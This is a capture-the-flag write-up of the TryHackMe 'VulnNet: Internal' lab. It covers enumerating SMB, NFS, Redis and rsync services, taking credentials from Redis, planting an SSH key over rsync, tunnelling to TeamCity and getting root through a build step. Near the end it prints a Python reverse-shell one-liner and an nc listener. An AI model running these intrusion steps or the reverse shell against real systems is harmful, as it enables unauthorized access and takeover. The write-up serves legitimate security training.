---
title: "TryHackMe - VulnNet: Internal"
author: Nasrallah
description: ""
date: 2022-11-11 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, rsync, smb, nfs, redis, tunneling, reverse-shell]
img_path: /assets/img/tryhackme/vulnnetinternal
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [VulnNet: Internal](https://tryhackme.com/room/vulnnetinternal) from [TryHackMe](https://tryhackme.com). The target is running multiple services each one has it's own weaknesses. After jumping from one service to another, we find a misconfigured service that gives us the ability to download and upload files to the server, we exploit that by upload our public key and key access to the server. We find a service running locally that we can't access from outside the target so we use an ssh tunnel and get to it, then we use the service feature to get a reverse shell as root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.68.193                                                                                                                    [21/429]
Host is up (0.093s latency).  
Not shown: 993 closed tcp ports (reset) 
PORT     STATE    SERVICE     VERSION                                         
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:               
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
|_  256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo:          
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind     
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs                                        
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs                                                                                                                       
|   100003  3,4         2049/tcp6  nfs                                        
|   100005  1,2,3      44697/tcp6  mountd
|   100005  1,2,3      51833/tcp   mountd
|   100005  1,2,3      52292/udp   mountd
|   100005  1,2,3      56601/udp6  mountd
|   100021  1,3,4      33047/tcp6  nlockmgr
|   100021  1,3,4      38643/tcp   nlockmgr
|   100021  1,3,4      39069/udp6  nlockmgr
|   100021  1,3,4      41447/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h13m05s, deviation: 1h09m16s, median: -33m06s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-16T06:24:07
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-10-16T08:24:07+02:00

```

We found a bunch open ports running multiple services, we have ssh, smb, nfs, rsync and rpc.

### SMB

Let's start with smb by listing the available shares with the command `sudo smbclient -L //10.10.68.193 -N `.

```terminal
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        VULNNET-INTERNA      vulnnet-internal server (Samba, Ubuntu)

        Workgroup            Master
        ---------            -------
        WORKGROUP            

```

We found 3 shares, let's connect to the share named `shares` with the command `sudo smbclient //10.10.68.193/shares -N`.

```terminal
$ sudo smbclient //10.10.68.193/shares -N 

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3279040 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

                11309648 blocks of size 1024. 3279040 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \temp\> cd ../data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3279040 blocks available
smb: \data\> get data.txt 
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> get business-req.txt
getting file \data\business-req.txt of size 190 as business-req.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \data\> 
```

We found 3 text file that we downloaded with the command `get {filename}`.

One of the files contains the first flag, the others are not really helpful.

### NFS

Let's enumerate nfs by listing the available share using this command `showmount -e 10.10.10.10`

```terminal
$ showmount -e 10.10.68.193
Export list for 10.10.68.193:
/opt/conf *

```

We found the share `/opt/conf`, let's mount it using the following commands.

```bash
mkdir /tmp/share
sudo mount -t nfs IP:/opt/conf /tmp/share -nolock
```

```terminal
$ mkdir /tmp/share                                                                                                                                   130 ⨯
                                                                                                                                                             
$ sudo mount -t nfs 10.10.68.193:/opt/conf /tmp/share -nolock
                                                                                                                                                             
$ ls -al /tmp/share
total 36
drwxr-xr-x  9 root root 4096 Feb  2  2021 .
drwxrwxrwt 16 root root 4096 Oct 16 03:17 ..
drwxr-xr-x  2 root root 4096 Feb  2  2021 hp
drwxr-xr-x  2 root root 4096 Feb  2  2021 init
drwxr-xr-x  2 root root 4096 Feb  2  2021 opt
drwxr-xr-x  2 root root 4096 Feb  2  2021 profile.d
drwxr-xr-x  2 root root 4096 Feb  2  2021 redis
drwxr-xr-x  2 root root 4096 Feb  2  2021 vim
drwxr-xr-x  2 root root 4096 Feb  2  2021 wildmidi
                                             
```

I changed the directory to /tmp/share and listed the content of every directory with `ls -al ./*`. I found a config file in redis directory.

![](1.png)

The file contains a password for redis.

### Redis

The scan didn't show a redis server earlier, maybe if we scanned all ports we would have found it.
Any way, let's connect to redis using `redis-cli -h 10.10.10.10`

```terminal
$ redis-cli -h 10.10.68.193
10.10.68.193:6379> AUTH B65Hx562F@REDACTED
OK
(1.05s)
10.10.68.193:6379> INFO keyspace
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
10.10.68.193:6379> SELECT 0
OK
10.10.68.193:6379> KEYS *
1) "internal flag"
2) "int"
3) "authlist"
4) "marketlist"
5) "tmp"
10.10.68.193:6379> get "internal flag"
"THM{ff8e518addbbxxxxxxxxxa724236a8221}"
10.10.68.193:6379> get "authlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
```

After connecting to the redis server, we authenticate with `AUTH {password}`, then we list the available databases with `INFO keyspace`, this shows one database that contains 4 keys, we select that database with `SELECT 0` because in redis the databases are numbers starting from 0. Then we list the keys with `KEYS *`. To get the content of a key, we use `get {key}`.

We couldn't get the `authlist` the normal way, but we can get it with `LRANGE authlist 0 -1`

```terminal
10.10.68.193:6379> LRANGE authlist 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

```

We got a base64 encoded string, let's decode it with the following command:

```bash
echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d

Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@xxx
```

### Rsync Hcg3HP67@TW@Bc72v

We got credentials for rsync, let's connect.

```terminal
$ rsync rsync://rsync-connect@10.10.10.10
files           Necessary home interaction
```

Let's see what's on `files`.

```terminal
$ rsync rsync://rsync-connect@10.10.68.193/files                                                                                     
Password: 
drwxr-xr-x          4,096 2021/02/01 07:51:14 .
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
```

Now if we list `sys-internal`, we get tons of file, but we notice a .ssh directory,

## **Foothold**

Let's download the content of the ssh directory to our machine.

![](2.png)

The directory is empty. Let's upload an **authorized_keys** file that contains our public key.

First, let's generate a key with `ssh-keygen -f ./id_rsa`, then we copy the public key to authorized_keys and upload it.

![](3.png)

Now let's connect.

![](4.png)


## **Privilege Escalation**

After some basic enumeration, we find an unusual directory in `/`.

![](5.png)

Reading the readme file we find this:

![](6.png)

Teamcity is running on port 8111, let's create an ssh tunnel with the following command:

```bash
ssh -L 8000:127.0.0.1:8111 sys-internal@10.10.146.234 -i id_rsa -fN 
```

Now we can navigate to http://localhost:8000/

![](7.png)

We got a login page, let's look for credentials in Teamcity file.

![](8.png)

We found super user token in /TeamCity/logs/catalina.out.

Now go to the login page and lick on `as super user`

![](9.png)

Use the token we got to login.

![](10.png)

Let's create a new project

![](11.png)

Press Save.

![](12.png)

Now go to `create build configuration` and create a build.

![](16.png)

Press save and skip the next step, then go to build steps.

![](17.png)

Click `Add build step` and select command line.

![](13.png)

Put the following command in the Custom script area:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

>Don't forget to change the ip address.

Save the changes and setup a listener with `nc -lvnp 9001`.

![](14.png)

Press the run button to receive a reverse shell as root.

![](15.png)

Gongrats, we have finally rooted the machine.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
